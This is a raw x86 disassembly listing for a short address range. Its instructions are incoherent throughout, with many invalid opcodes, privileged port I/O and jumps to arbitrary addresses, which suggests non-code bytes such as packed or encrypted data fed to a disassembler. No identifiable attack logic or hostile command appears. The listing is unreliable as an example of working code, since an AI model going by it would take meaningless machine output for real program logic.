  40fa09:	mov    ecx,0xc2a0393e
  40fa0e:	push   cs
  40fa0f:	addr16 and eax,0xa313dcc1
  40fa15:	sbb    esp,DWORD PTR [edx+0x29d1765a]
  40fa1b:	rcr    DWORD PTR [ebx-0x143641f1],1
  40fa21:	icebp  
  40fa22:	mov    bh,0xc3
  40fa24:	sub    eax,0xeef012b4
  40fa29:	test   BYTE PTR [edx-0x3f530048],0x3b
  40fa30:	stc    
  40fa31:	aas    
  40fa32:	xchg   esp,ecx
  40fa34:	test   BYTE PTR [esi-0x6e],bl
  40fa37:	daa    
  40fa38:	sbb    dl,BYTE PTR [esi-0x6a7c94ad]
  40fa3e:	jno    0x40fa71
  40fa40:	out    0x86,al
  40fa42:	fnstcw WORD PTR [edx]
  40fa44:	cmp    ebp,DWORD PTR [eax+ebx*1]
  40fa47:	jbe    0x40fa3f
  40fa49:	push   ds
  40fa4a:	sti    
  40fa4b:	(bad)  
  40fa4c:	std    
  40fa4d:	sub    al,0x5e
  40fa4f:	xchg   edi,eax
  40fa50:	mov    eax,0xe4b71018
  40fa55:	rcr    DWORD PTR [eax],1
  40fa57:	inc    edx
  40fa58:	in     eax,dx
  40fa59:	sub    DWORD PTR [edi],esi
  40fa5b:	xor    eax,ebp
  40fa5d:	cmp    edi,esi
  40fa5f:	push   eax
  40fa60:	mov    BYTE PTR [ebx],al
  40fa62:	mov    cl,0x76
  40fa64:	sub    BYTE PTR [edx-0x3a],bh
  40fa67:	fsub   DWORD PTR [eax+0x29]
  40fa6a:	pop    ss
  40fa6b:	dec    esp
  40fa6c:	or     BYTE PTR [ebp-0x7781f196],0xfd
  40fa73:	jp     0x40faf0
  40fa75:	push   0xffffffbd
  40fa77:	jae    0x40fa25
  40fa79:	test   eax,0x58e2b357
  40fa7e:	jne    0x40facf
  40fa80:	fisttp DWORD PTR [ecx-0x7dd07ab6]
  40fa86:	repnz int3 
  40fa88:	adc    eax,0x381d8905
  40fa8d:	fsubr  DWORD PTR [ebp-0x19cc95ed]
  40fa93:	jl     0x40fa6e
  40fa95:	mov    edi,DWORD PTR [eax]
  40fa97:	es pop ds
  40fa99:	retf   
  40fa9a:	leave  
  40fa9b:	push   0x67cccb1a
  40faa0:	push   ds
  40faa1:	or     eax,0xd19948cc
  40faa6:	xchg   ecx,eax
  40faa7:	dec    edx
  40faa8:	push   0x7b5e7319
  40faad:	test   BYTE PTR ds:[ebx],0x55
  40fab1:	cli    
  40fab2:	cs (bad) 
  40fab4:	repz daa 
  40fab6:	xchg   edi,eax
  40fab7:	sub    DWORD PTR [eax],esp
  40fab9:	in     al,dx
  40faba:	or     al,BYTE PTR ds:0x525335e7
  40fac0:	adc    eax,DWORD PTR [esi+0x7585a198]
  40fac6:	add    eax,0x1e6483ee
  40facb:	sub    bl,BYTE PTR [ecx-0x60]
  40face:	fisubr WORD PTR [eax+edx*2-0x8]
  40fad2:	cld    
  40fad3:	xor    edi,esp
  40fad5:	mov    edi,0xda8a0d62
  40fada:	inc    esp
  40fadb:	leave  
  40fadc:	enter  0x51ed,0x85
  40fae0:	aaa    
  40fae1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fae2:	or     al,0xcd
  40fae4:	sahf   
  40fae5:	add    dh,BYTE PTR [ecx-0x1c24ff47]
  40faeb:	sub    ebx,0xffffffa7
  40faee:	lods   al,BYTE PTR ds:[esi]
  40faef:	js     0x40fb22
  40faf1:	push   0x16
  40faf3:	xor    al,ch
  40faf5:	jmp    0x150a843
  40fafa:	mov    ecx,0xed74c0a9
  40faff:	in     eax,dx
  40fb00:	mul    esi
  40fb02:	sub    al,0xa1
  40fb04:	aas    
  40fb05:	xor    DWORD PTR [edi-0x249121c],ecx
  40fb0b:	std    
  40fb0c:	and    ebx,DWORD PTR [edi+0x51]
  40fb0f:	xchg   DWORD PTR [ebp+edi*1+0x5d],ebx
  40fb13:	aad    0xca
  40fb15:	mov    ch,bh
  40fb17:	test   al,0x9c
  40fb19:	pop    es
  40fb1a:	or     DWORD PTR [ebx],ebx
  40fb1c:	lds    esi,FWORD PTR [edx-0x70a959d6]
  40fb22:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fb23:	outs   dx,BYTE PTR ds:[esi]
  40fb24:	jg     0x40fb58
  40fb26:	pushf  
  40fb27:	aaa    
  40fb28:	imul   esp,DWORD PTR [ecx+ebp*4-0x6c],0xed370de8
  40fb30:	ror    BYTE PTR [ebp-0x262e9d79],1
  40fb36:	fcomp  QWORD PTR [ecx+0x73483af8]
  40fb3c:	ins    DWORD PTR es:[edi],dx
  40fb3d:	test   BYTE PTR [ebp-0x669f264d],ah
  40fb43:	adc    BYTE PTR [eax+0x3b],0x3e
  40fb47:	leave  
  40fb48:	pop    edi
  40fb49:	cdq    
  40fb4a:	add    al,0x70
  40fb4c:	ficom  DWORD PTR ds:0x8d9533f3
  40fb52:	aas    
  40fb53:	pop    esp
  40fb54:	or     DWORD PTR ds:0x600f275e,0xffffffe8
  40fb5b:	inc    eax
  40fb5c:	mov    bl,0x95
  40fb5e:	test   al,0xd0
  40fb60:	add    al,BYTE PTR [edi]
  40fb62:	rcr    BYTE PTR [edi-0x76],1
  40fb65:	push   ds
  40fb66:	fst    DWORD PTR [edi]
  40fb68:	mov    ebx,0x127d05e5
  40fb6d:	dec    esp
  40fb6e:	jae    0x40fb81
  40fb70:	scas   al,BYTE PTR es:[edi]
  40fb71:	sbb    BYTE PTR [ecx-0x356906e2],dl
  40fb77:	sub    ch,BYTE PTR [ecx-0x51]
  40fb7a:	xor    BYTE PTR [esp+ebx*8],bl
  40fb7d:	mov    ecx,0xe22bb01d
  40fb82:	push   edi
  40fb83:	mov    al,ah
  40fb85:	mov    ecx,0x8cad686
  40fb8a:	adc    BYTE PTR [eax],0x6
  40fb8d:	sub    cl,al
  40fb8f:	es or  dl,dh
  40fb92:	sahf   
  40fb93:	dec    edi
  40fb94:	pop    ss
  40fb95:	adc    ecx,0x65
  40fb98:	and    ah,BYTE PTR [eax]
  40fb9a:	imul   eax,DWORD PTR [ebp+0x1f],0x4a
  40fb9e:	or     al,0xd0
  40fba0:	int3   
  40fba1:	or     ecx,DWORD PTR [edx-0x7933f380]
  40fba7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fba8:	daa    
  40fba9:	jno    0x40fb4f
  40fbab:	mov    cl,0x5
  40fbad:	ret    0xc90e
  40fbb0:	jae    0x40fbec
  40fbb2:	lock mov esi,0xb4b2cc58
  40fbb8:	in     eax,0xd8
  40fbba:	js     0x40fc0a
  40fbbc:	pop    eax
  40fbbd:	adc    DWORD PTR ds:0xf9635245,esi
  40fbc3:	or     eax,0x35797a53
  40fbc8:	enter  0xed07,0xe6
  40fbcc:	test   esi,edi
  40fbce:	inc    ebp
  40fbcf:	lods   al,BYTE PTR ds:[esi]
  40fbd0:	add    al,0xef
  40fbd2:	mov    eax,0x940fa3f0
  40fbd7:	or     BYTE PTR [ebx],ch
  40fbd9:	int3   
  40fbda:	stc    
  40fbdb:	inc    ecx
  40fbdc:	mov    DWORD PTR [esp+edi*2-0x2d],eax
  40fbe0:	cs cmp eax,0xb8cace2b
  40fbe6:	sub    edx,esp
  40fbe8:	mov    WORD PTR [ebp-0x24],fs
  40fbeb:	ja     0x40fc4e
  40fbed:	dec    esp
  40fbee:	pop    ds
  40fbef:	lods   al,BYTE PTR ds:[esi]
  40fbf0:	mov    ch,0x19
  40fbf2:	or     al,0x3d
  40fbf4:	psllq  mm5,QWORD PTR [ecx]
  40fbf7:	enter  0xaa03,0x49
  40fbfb:	aas    
  40fbfc:	neg    BYTE PTR [eax]
  40fbfe:	mov    ebx,0x414b0b9d
  40fc03:	jnp    0x40fc19
  40fc05:	jns    0x40fbb9
  40fc07:	test   eax,0x861832f0
  40fc0c:	loop   0x40fbd9
  40fc0e:	xor    al,0x96
  40fc10:	aas    
  40fc11:	icebp  
  40fc12:	mov    gs,esi
  40fc14:	scas   eax,DWORD PTR es:[edi]
  40fc15:	ins    DWORD PTR es:[edi],dx
  40fc16:	mov    DWORD PTR [edx-0x3ca82729],esp
  40fc1c:	lock xchg ebp,eax
  40fc1e:	imul   ebp,DWORD PTR [esi],0xd5017bd1
  40fc24:	fsubr  st,st(7)
  40fc26:	adc    bl,BYTE PTR [edi+eiz*8-0x5d492a70]
  40fc2d:	jnp    0x40fbc7
  40fc2f:	bound  esp,QWORD PTR [eax+0x6e]
  40fc32:	xchg   ebp,eax
  40fc33:	fwait
  40fc34:	(bad)  
  40fc35:	js     0x40fcaf
  40fc37:	mov    BYTE PTR [ecx-0x37a5a6a],bh
  40fc3d:	pushf  
  40fc3e:	mov    ebx,DWORD PTR [eax-0x5786657c]
  40fc44:	mov    al,ds:0xa858dd33
  40fc49:	adc    al,0x5d
  40fc4b:	loope  0x40fc52
  40fc4d:	or     eax,0xe97488f7
  40fc52:	cmp    eax,0x3383429c
  40fc57:	imul   ecx,DWORD PTR [eax+eiz*1-0x5c3b4e85],0x59
  40fc5f:	(bad)  [ebx-0x74dfadc4]
  40fc65:	cmp    BYTE PTR [ebp-0x58d1e18c],dl
  40fc6b:	mov    bl,0x21
  40fc6d:	sub    BYTE PTR [ebx],dh
  40fc6f:	retf   0x6368
  40fc72:	sbb    eax,0xdfa779d9
  40fc77:	int3   
  40fc78:	ret    
  40fc79:	loop   0x40fc4f
  40fc7b:	(bad)  
  40fc7c:	retf   
  40fc7d:	popf   
  40fc7e:	scas   eax,DWORD PTR es:[edi]
  40fc7f:	jnp    0x40fc26
  40fc81:	sub    edi,esi
  40fc83:	fbld   TBYTE PTR [ebx+0x5d2a4ca5]
  40fc89:	cs xor al,0xe7
  40fc8c:	in     eax,0xea
  40fc8e:	pusha  
  40fc8f:	(bad)  
  40fc90:	neg    BYTE PTR [edx-0x6b0a58e5]
  40fc96:	xor    al,cl
  40fc98:	push   0xfffffff2
  40fc9a:	and    ch,BYTE PTR [ecx-0x6ddaf272]
  40fca0:	jg     0x40fc79
  40fca2:	inc    esp
  40fca3:	or     al,0xcc
  40fca5:	jae    0x40fcef
  40fca7:	enter  0x24ad,0x68
  40fcab:	fwait
  40fcac:	das    
  40fcad:	test   BYTE PTR [ebp+0x119e47dc],dl
  40fcb3:	test   al,0x47
  40fcb5:	or     ecx,DWORD PTR ds:0x63a502b2
  40fcbb:	mov    ds:0xf51f5477,al
  40fcc0:	add    DWORD PTR [eax+0x28b56e75],edi
  40fcc6:	addr16 xor al,0xcb
  40fcc9:	fstp   DWORD PTR [edx]
  40fccb:	out    dx,al
  40fccc:	mov    DWORD PTR [ebx],ebx
  40fcce:	push   ds
  40fccf:	adc    DWORD PTR [esi+0x15],0xffffff85
  40fcd3:	inc    edx
  40fcd4:	add    DWORD PTR [esi-0x7c],ebp
  40fcd7:	(bad)  
  40fcd8:	je     0x40fcfc
  40fcda:	fidiv  DWORD PTR [edi+0xc]
  40fcdd:	in     eax,dx
  40fcde:	sbb    al,0x6a
  40fce0:	push   ebx
  40fce1:	xor    dl,BYTE PTR [esi+0x118405e3]
  40fce7:	ret    
  40fce8:	fdivr  QWORD PTR [eax-0x3a3e8849]
  40fcee:	pushf  
  40fcef:	dec    ecx
  40fcf0:	das    
  40fcf1:	ds push es
  40fcf3:	fbld   TBYTE PTR [eax+edx*1]
  40fcf6:	add    bh,BYTE PTR [eax-0x1a550bc1]
  40fcfc:	inc    ebx
  40fcfd:	pusha  
  40fcfe:	sbb    DWORD PTR [edx+0x68],ebx
  40fd01:	dec    esi
  40fd02:	pop    esp
  40fd03:	mov    ds:0xae7608e,eax
  40fd08:	rol    DWORD PTR [ebp+0x18],0x68
  40fd0c:	lds    esp,FWORD PTR [esi+0x28]
  40fd0f:	inc    esp
  40fd10:	cmp    DWORD PTR [ebx],eax
  40fd12:	mov    dh,0xe3
  40fd14:	int    0xf1
  40fd16:	xlat   BYTE PTR ds:[ebx]
  40fd17:	adc    eax,0x1a24a1d7
  40fd1c:	gs dec esp
  40fd1e:	dec    eax
  40fd1f:	inc    ecx
  40fd20:	or     ebp,esp
  40fd22:	fisub  DWORD PTR [eax+ecx*2]
  40fd25:	pop    ecx
  40fd26:	div    esi
  40fd28:	pop    esi
  40fd29:	and    BYTE PTR [eax],dl
  40fd2b:	mov    bh,0x5c
  40fd2d:	cwde   
  40fd2e:	push   DWORD PTR [ebx+0x62c1d0b9]
  40fd34:	dec    eax
  40fd35:	mov    al,ds:0x4f7ea2be
  40fd3a:	pop    edi
  40fd3b:	jle    0x40fd44
  40fd3d:	or     DWORD PTR [ebp+0x547189be],esp
  40fd43:	sub    cl,BYTE PTR ds:0xebfd08d8
  40fd49:	add    al,0x48
  40fd4b:	jae    0x40fdca
  40fd4d:	sub    BYTE PTR [edi+0x6928c0ef],ch
  40fd53:	sub    DWORD PTR [eax+0x64866f31],ecx
  40fd59:	test   eax,0x58375ca0
  40fd5e:	xchg   ebx,eax
  40fd5f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fd60:	ja     0x40fd75
  40fd62:	es cs jo 0x40fcf7
  40fd66:	js     0x40fd00
  40fd68:	lods   eax,DWORD PTR ds:[esi]
  40fd69:	mov    BYTE PTR [edi+0x46],cl
  40fd6c:	dec    ebp
  40fd6d:	int    0xa3
  40fd6f:	ins    DWORD PTR es:[edi],dx
  40fd70:	imul   ecx,DWORD PTR [esi+0x0],0x81f8b03d
  40fd77:	pusha  
  40fd78:	mov    eax,0xae8d6b10
  40fd7d:	mov    eax,ds:0xa6639d57
  40fd82:	popa   
  40fd83:	jns    0x40fdce
  40fd85:	sbb    ebp,DWORD PTR [esi+eax*4+0x40]
  40fd89:	push   0x7285ffcb
  40fd8e:	dec    edi
  40fd8f:	(bad)  
  40fd90:	ror    DWORD PTR [ebp+0x6d],1
  40fd93:	xchg   BYTE PTR [esi+eiz*4],dl
  40fd96:	(bad)  
  40fd97:	adc    eax,0x33bb8d1
  40fd9c:	jb     0x40fd8c
  40fd9e:	dec    ecx
  40fd9f:	(bad)  
  40fda0:	xchg   ebp,eax
  40fda1:	fisub  WORD PTR [ecx+eiz*1+0x23]
  40fda5:	repz mov dh,0xf7
  40fda8:	ss jno 0x40fe1d
  40fdab:	fild   WORD PTR [edi+0x76]
  40fdae:	cld    
  40fdaf:	push   ebp
  40fdb0:	std    
  40fdb1:	dec    esp
  40fdb2:	(bad)  
  40fdb3:	mov    al,ds:0x3f4b08cd
  40fdb8:	xchg   ecx,eax
  40fdb9:	sti    
  40fdba:	dec    ebx
  40fdbb:	jmp    0x360e:0xf0d408ad
  40fdc2:	sbb    BYTE PTR [ebx+edx*8],dl
  40fdc5:	imul   esi,DWORD PTR [ebx+0x12],0x3d
  40fdc9:	jno    0x40fdee
  40fdcb:	push   es
  40fdcc:	test   BYTE PTR [eax+0x56],dh
  40fdcf:	push   eax
  40fdd0:	fiadd  WORD PTR [ebx]
  40fdd2:	sahf   
  40fdd3:	fdivr  DWORD PTR [eax+0x3fe21f1e]
  40fdd9:	dec    edi
  40fdda:	inc    esi
  40fddb:	mov    ds:0x9017902a,al
  40fde0:	push   cs
  40fde1:	fisub  DWORD PTR [esi+0x46810828]
  40fde7:	dec    esp
  40fde8:	les    ebp,FWORD PTR [esp+ebx*4-0x3]
  40fdec:	mov    WORD PTR [edi-0x5fad512a],ds
  40fdf2:	jg     0x40fd94
  40fdf4:	xchg   edi,eax
  40fdf5:	or     ah,BYTE PTR [edx+0x18]
  40fdf8:	cmp    bh,dh
  40fdfa:	sub    al,0x73
  40fdfc:	fnstcw WORD PTR [eax-0x33]
  40fdff:	hlt    
  40fe00:	add    dl,dh
  40fe02:	dec    esi
  40fe03:	dec    ebp
  40fe04:	imul   esp,DWORD PTR [ebx],0xdc349fbf
  40fe0a:	cdq    
  40fe0b:	sub    DWORD PTR [eax-0x1a02a0f1],eax
  40fe11:	xlat   BYTE PTR ds:[ebx]
  40fe12:	xor    BYTE PTR [esi+edx*1-0x753330af],dh
  40fe19:	inc    esp
  40fe1a:	inc    edi
  40fe1b:	mov    al,ds:0xdd1975dd
  40fe20:	or     al,0xad
  40fe22:	inc    ebp
  40fe23:	lfs    esi,FWORD PTR [edi+edx*8]
  40fe27:	aad    0x36
  40fe29:	mov    ebp,DWORD PTR [ecx-0x5089d015]
  40fe2f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fe30:	js     0x40fde3
  40fe32:	sahf   
  40fe33:	lock mov bh,BYTE PTR [edi]
  40fe36:	push   0xdfc0e8ea
  40fe3b:	adc    bh,BYTE PTR [eax-0x6c6a80d1]
  40fe41:	add    al,BYTE PTR [edx-0x3]
  40fe44:	mov    ds:0x2f01c3e7,al
  40fe49:	adc    DWORD PTR [eax],edx
  40fe4b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fe4c:	mov    ds:0xec63b55e,al
  40fe51:	jp     0x40fdd3
  40fe53:	(bad)
  40fe57:	mov    ch,0x92
  40fe59:	je     0x40fe80
  40fe5b:	pusha  
  40fe5c:	test   BYTE PTR [ebx+0x1a55536c],ah
  40fe62:	repz push ds
  40fe64:	popf   
  40fe65:	sahf   
  40fe66:	sub    eax,0x69447edf
  40fe6b:	mov    al,ds:0x92491ba7
  40fe70:	sub    al,0x91
  40fe72:	adc    esp,DWORD PTR [edx]
  40fe74:	int    0x99
  40fe76:	mov    esi,0x7059b969
  40fe7b:	bnd ret 
  40fe7d:	loope  0x40fe9a
  40fe7f:	jg     0x40feb9
  40fe81:	pop    esi
  40fe82:	dec    edi
  40fe83:	test   al,0x71
  40fe85:	pop    es
  40fe86:	dec    ebp
  40fe87:	push   eax
  40fe88:	xor    eax,0x8f3485e3
  40fe8d:	loopne 0x40fe5f
  40fe8f:	clc    
  40fe90:	arpl   WORD PTR [edi+0x3c],bx
  40fe93:	mov    bh,al
  40fe95:	add    edx,DWORD PTR [ecx-0x4c]
  40fe98:	add    al,0x5b
  40fe9a:	(bad)  
  40fe9b:	mov    ecx,0x56f96471
  40fea0:	lods   eax,DWORD PTR ds:[esi]
  40fea1:	adc    DWORD PTR [edi+0x28ef537a],eax
  40fea7:	daa    
  40fea8:	mov    ecx,0x4e340a1a
  40fead:	push   cs
  40feae:	daa    
  40feaf:	or     dl,BYTE PTR [edx+0x7e]
  40feb2:	add    DWORD PTR [edx],eax
  40feb4:	dec    ebp
  40feb5:	loope  0x40fecb
  40feb7:	xchg   esp,ebp
  40feb9:	rcl    BYTE PTR ds:0x3864903b,0xee
  40fec0:	mov    ss,WORD PTR [ebx-0x28]
  40fec3:	jp     0x40ff3b
  40fec5:	push   esp
  40fec6:	xor    eax,DWORD PTR [edx]
  40fec8:	les    esp,FWORD PTR [ebp+0x49]
  40fecb:	mov    eax,fs
  40fecd:	ds jne 0x40ff3f
  40fed0:	test   DWORD PTR ds:0xa9bd6bd8,ecx
  40fed6:	test   DWORD PTR [ebx-0xfd787ed],ebp
  40fedc:	sub    eax,0x69adbc7a
  40fee1:	iret   
  40fee2:	jp     0x40fe69
  40fee4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fee5:	sahf   
  40fee6:	ja     0x40feec
  40fee8:	outs   dx,DWORD PTR ds:[esi]
  40fee9:	and    DWORD PTR [ebp-0x5e6efe1e],edx
  40feef:	push   ds
  40fef0:	jno    0x40fed0
  40fef2:	jae    0x40ff54
  40fef4:	push   ebp
  40fef5:	xor    cl,BYTE PTR [ecx+0x7a]
  40fef8:	or     eax,0x99d7d53d
  40fefd:	sahf   
  40fefe:	and    al,0x1a
  40ff00:	rol    BYTE PTR [ebx],cl
  40ff02:	xchg   esp,eax
  40ff03:	xchg   edi,eax
  40ff04:	push   ebx
  40ff05:	jmp    0x40feef
  40ff07:	add    BYTE PTR [eax-0x4b],cl
  40ff0a:	fnstcw WORD PTR [esp+edi*1]
  40ff0d:	out    dx,eax
  40ff0e:	icebp  
  40ff0f:	mov    esi,0xb3f3d207
  40ff14:	add    al,0xa7
  40ff16:	rol    BYTE PTR [edx-0x7],0xd
  40ff1a:	sub    ah,dl
  40ff1c:	xchg   ebp,eax
  40ff1d:	jge    0x40ff44
  40ff1f:	jae    0x40ff21
  40ff21:	adc    eax,0xab48fa8a
  40ff26:	adc    DWORD PTR gs:[eax-0x26],0xaea43677
  40ff2e:	jg     0x40ff45
  40ff30:	mov    bl,0x85
  40ff32:	das    
  40ff33:	xchg   edx,eax
  40ff34:	mov    ebp,0x3fd6596b
  40ff39:	sahf   
  40ff3a:	(bad)  
  40ff3b:	pop    ebx
  40ff3c:	mov    ch,0xa8
  40ff3e:	dec    ebx
  40ff3f:	fidiv  WORD PTR [eax+edi*1]
  40ff42:	lock add al,0xf4
  40ff46:	adc    eax,0xfe9db6b5
  40ff4b:	aas    
  40ff4c:	fs mov eax,edi
  40ff4f:	sbb    DWORD PTR [eax-0x57],0x72
  40ff53:	xor    BYTE PTR [ebx-0x1f],bl
  40ff56:	and    ecx,ebx
  40ff58:	or     dl,ch
  40ff5a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ff5b:	fsubr  st(4),st
  40ff5d:	lods   al,BYTE PTR ds:[esi]
  40ff5e:	sti    
  40ff5f:	fwait
  40ff60:	shl    DWORD PTR [edi+0x15],0x18
  40ff64:	lock (bad) 
  40ff66:	outs   dx,DWORD PTR ds:[esi]
  40ff67:	retf   
  40ff68:	fcomi  st,st(4)
  40ff6a:	jne    0x40ff9d
  40ff6c:	pop    es
  40ff6d:	xchg   edi,eax
  40ff6e:	or     DWORD PTR [edx-0x3cc1c962],0xffffffdb
  40ff75:	int    0x32
  40ff77:	mov    eax,ds:0x4b1bf816
  40ff7c:	sbb    DWORD PTR [edx+0x761142d5],edi
  40ff82:	in     eax,0xe2
  40ff84:	arpl   WORD PTR [esi-0x17c12039],cx
  40ff8a:	in     al,0xd2
  40ff8c:	and    al,0xe5
  40ff8e:	pop    ebp
  40ff8f:	sti    
  40ff90:	jae    0x40ff13
  40ff92:	mov    ch,0x59
  40ff94:	add    DWORD PTR [edi+0x59],esi
  40ff97:	in     al,0xda
  40ff99:	nop
  40ff9a:	dec    ebp
  40ff9b:	packssdw mm5,QWORD PTR [eax+0x20]
  40ff9f:	fs inc esp
  40ffa1:	pushf  
  40ffa2:	popf   
  40ffa3:	dec    ecx
  40ffa4:	adc    BYTE PTR [edi-0x6db2d4d2],al
  40ffaa:	pop    ebx
  40ffab:	int3   
  40ffac:	mov    DWORD PTR [esi+0x2233462b],ecx
  40ffb2:	inc    ebx
  40ffb3:	test   DWORD PTR [eax+0x68abc3b3],eax
  40ffb9:	mov    dl,0x1d
  40ffbb:	rcr    DWORD PTR [ebx-0x27],0x78
  40ffbf:	dec    ecx
  40ffc0:	sti    
  40ffc1:	test   al,0xa0
  40ffc3:	fld    DWORD PTR [esi-0x78]
  40ffc6:	test   al,0xcb
  40ffc8:	loopne 0x410041
  40ffca:	rep stos DWORD PTR es:[edi],eax
  40ffcc:	mov    bl,0x6f
  40ffce:	retf   
  40ffcf:	lds    edx,FWORD PTR [eax+0x29]
  40ffd2:	xor    al,0x5a
  40ffd4:	or     DWORD PTR [ebp-0x361f0bec],0xffffff81
  40ffdb:	pop    esi
  40ffdc:	call   0xf9728498
  40ffe1:	xor    al,0x30
  40ffe3:	popa   
  40ffe4:	ss aaa 
  40ffe6:	push   cs
  40ffe7:	mov    edi,0x60cb2524
  40ffec:	add    DWORD PTR [ebx+edi*2],edi
  40ffef:	sbb    DWORD PTR [esi-0x2bb34a6c],ebx
  40fff5:	mov    esp,0x1a2ab24a
  40fffa:	fwait
  40fffb:	add    DWORD PTR [ebp+0x12],ebx
  40fffe:	or     BYTE PTR [ebx-0x6e80e100],0xf8
  410005:	and    DWORD PTR [ebp+0x22],ebp
  410008:	inc    ecx
  410009:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41000a:	pop    ebp
  41000b:	mov    dl,0xa3
  41000d:	cmp    edx,DWORD PTR [esi]
  41000f:	and    al,0xcc
  410011:	rcl    BYTE PTR [ebp+ebx*8-0x891ec38],0xcf
  410019:	neg    DWORD PTR [ebx+0x8]
  41001c:	mov    ds:0xf9454a24,al
  410021:	jge    0x41008b
  410023:	dec    edx
  410024:	mov    dh,0x5
  410026:	sbb    esi,DWORD PTR [esi+edx*1]
  410029:	push   esi
  41002a:	jae    0x40ffbb
  41002c:	scas   eax,DWORD PTR es:[edi]
  41002d:	aaa    
  41002e:	jno    0x4100a4
  410030:	in     al,dx
  410031:	jp     0x40ffef
  410033:	jnp    0x4100a4
  410035:	fs retf 
  410037:	xchg   ecx,eax
  410038:	in     al,dx
  410039:	push   0xaa9e2655
  41003e:	lock mov al,ds:0xc84ad965
  410044:	les    esi,FWORD PTR [esi+0x7ba2926b]
  41004a:	das    
  41004b:	xchg   ebx,eax
  41004c:	pop    ebp
  41004d:	sub    dh,BYTE PTR [esi]
  41004f:	adc    cl,BYTE PTR [eax-0x80]
  410052:	xchg   eax,esp
  410054:	lea    eax,[ecx]
  410056:	mov    dl,0xf1
  410058:	mov    DWORD PTR [bx-0x20b9],esi
  41005d:	sub    bh,al
  41005f:	inc    edx
  410060:	shr    BYTE PTR [esi-0x6ba2098],cl
  410066:	adc    ch,0x1f
  410069:	mov    edi,0x3042f113
  41006e:	dec    esi
  41006f:	or     DWORD PTR [ebx+eax*4+0x354e7b0d],ebp
  410076:	les    edx,FWORD PTR [edi-0x34]
  410079:	(bad)  
  41007a:	sbb    DWORD PTR [ecx-0x7990ad36],edx
  410080:	inc    ebx
  410081:	test   DWORD PTR [edi],0x139b6e4b
  410087:	dec    ebp
  410088:	jo     0x410104
  41008a:	push   cs
  41008b:	pop    ebx
  41008c:	(bad)  
  41008d:	mov    al,ds:0x24bfd458
  410092:	(bad)  
  410093:	cmc    
  410094:	out    0x79,al
  410096:	out    dx,eax
  410097:	hlt    
  410098:	and    dl,BYTE PTR [ebx+edi*2-0x44f0d1bb]
  41009f:	inc    edi
  4100a0:	nop
  4100a1:	jmp    0x4100b7
  4100a3:	scas   al,BYTE PTR es:[edi]
  4100a4:	push   cs
  4100a5:	and    eax,0x959aa46
  4100aa:	(bad)  
  4100ac:	push   esp
  4100ad:	les    ebx,FWORD PTR [edi-0x72815e65]
  4100b3:	fucomi st,st(0)
  4100b5:	inc    ebp
  4100b6:	sub    al,0x5f
  4100b8:	inc    ecx
  4100b9:	ret    0xdb3d
  4100bc:	push   edi
  4100bd:	(bad)  
  4100be:	jmp    0xde57:0xba1f6585
  4100c5:	fisub  DWORD PTR [ebp-0x795df7e3]
  4100cb:	cwde   
  4100cc:	pop    es
  4100cd:	stos   DWORD PTR es:[edi],eax
  4100ce:	(bad)  
  4100cf:	jmp    0x4100f1
  4100d1:	(bad)  
  4100d2:	out    dx,al
  4100d3:	test   al,0xb
  4100d5:	pop    ecx
  4100d6:	out    0x57,eax
  4100d8:	and    BYTE PTR [ebx],ah
  4100da:	outs   dx,BYTE PTR ds:[esi]
  4100db:	jne    0x410092
  4100dd:	inc    ecx
  4100de:	pop    ecx
  4100df:	stos   BYTE PTR es:[edi],al
  4100e0:	jo     0x4100cc
  4100e2:	xor    bl,ah
  4100e4:	dec    eax
  4100e5:	lods   eax,DWORD PTR ds:[esi]
  4100e6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4100e7:	int3   
  4100e8:	pop    ss
  4100e9:	lds    edi,FWORD PTR [ebx]
  4100eb:	jg     0x4100f0
  4100ed:	iret   
  4100ee:	call   FWORD PTR [esi-0x50]
  4100f1:	pushf  
  4100f2:	pop    ebp
  4100f3:	xor    DWORD PTR [ebx+0x58],esi
  4100f6:	retf   0x919b
  4100f9:	enter  0x90f,0x17
  4100fd:	xchg   esi,eax
  4100fe:	mov    ebx,DWORD PTR [ebx]
  410100:	dec    ah
  410102:	test   al,0x28
  410104:	jmp    0xfe248407
  410109:	aaa    
  41010a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41010b:	clc    
  41010c:	mov    esi,0xf8f681d5
  410111:	push   edi
  410112:	lock (bad) 
  410114:	fs mov eax,0x8567321
  41011a:	mov    ds:0xd5ed3313,al
  41011f:	outs   dx,BYTE PTR ds:[esi]
  410120:	aas    
  410121:	pop    eax
  410122:	xor    ecx,DWORD PTR [esi]
  410124:	mov    ecx,0x87a7d72f
  410129:	ss mov bx,0xf1c7
  41012e:	gs pop ss
  410130:	cmp    al,0xc3
  410132:	mov    eax,ds:0x2e79f9fa
  410137:	mov    al,0x5e
  410139:	mov    ?,WORD PTR [ecx+0x53]
  41013c:	lock imul ebx,ebx,0x53b92802
  410143:	xchg   BYTE PTR [ebx],bl
  410145:	sub    BYTE PTR [edi],ah
  410147:	stos   DWORD PTR es:[edi],eax
  410148:	add    DWORD PTR [eax+0x696c3be1],edx
  41014e:	test   al,0x2d
  410150:	adc    al,0x4b
  410152:	or     esp,DWORD PTR [ebx]
  410154:	push   es
  410155:	sbb    BYTE PTR [edi-0x1a60692b],cl
  41015b:	push   cs
  41015c:	aaa    
  41015d:	into   
  41015e:	pop    ebx
  41015f:	in     eax,0xad
  410161:	ss test al,0xa5
  410164:	xchg   esp,eax
  410165:	stos   BYTE PTR es:[edi],al
  410166:	xchg   edx,eax
  410167:	jne    0x41011a
  410169:	sbb    DWORD PTR [ecx+0x76],eax
  41016c:	add    BYTE PTR [edx],ch
  41016e:	jo     0x410186
  410170:	jae    0x41015a
  410172:	ds push ebx
  410174:	addr16 jnp 0x410165
  410177:	sub    dl,BYTE PTR [ecx]
  410179:	and    bl,BYTE PTR [esp+eiz*2+0x5d106c3]
  410180:	xor    BYTE PTR [eax],bl
  410182:	(bad)  
  410184:	mov    al,ds:0x9bcc8344
  410189:	mov    dl,0x8e
